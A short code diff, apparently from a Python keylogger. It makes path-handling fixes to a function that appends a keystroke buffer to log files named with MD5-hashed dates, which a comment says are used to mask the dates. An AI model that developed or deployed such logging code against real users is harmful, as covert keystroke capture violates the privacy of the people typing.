@@ -199,7 +199,7 @@ cyrillic_layouts = ['Russian', 'Russian - Moldava', 'Azeri (Cyrillic)', 'Belarus
                               'Kyrgyz (Cyrillic)', 'Mongolian (Cyrillic)', 'Tajik', 'Tatar', 'Serbian (Cyrillic)',
                               'Ukrainian', 'Uzbek (Cyrillic)']
 
-full_path = os.path.dirname(os.path.realpath(__file__))
+full_path = os.path.dirname(os.path.realpath(sys.argv[0]))
 
 # Determine the initial keyboard layout - to fix the keyboard module bug.
 
@@ -317,7 +317,7 @@ def log_local():
     # md5 only for masking dates - it's easily crackable:
     todays_date_hashed = hashlib.md5(bytes(todays_date, 'utf-8')).hexdigest()
     try:
-        with open(full_path + "\\" + todays_date_hashed + ".txt", "a") as fp:
+        with open(os.path.join(full_path, todays_date_hashed + ".txt"), "a") as fp:
             fp.write(line_buffer)
     except Exception as e:
         print(e)
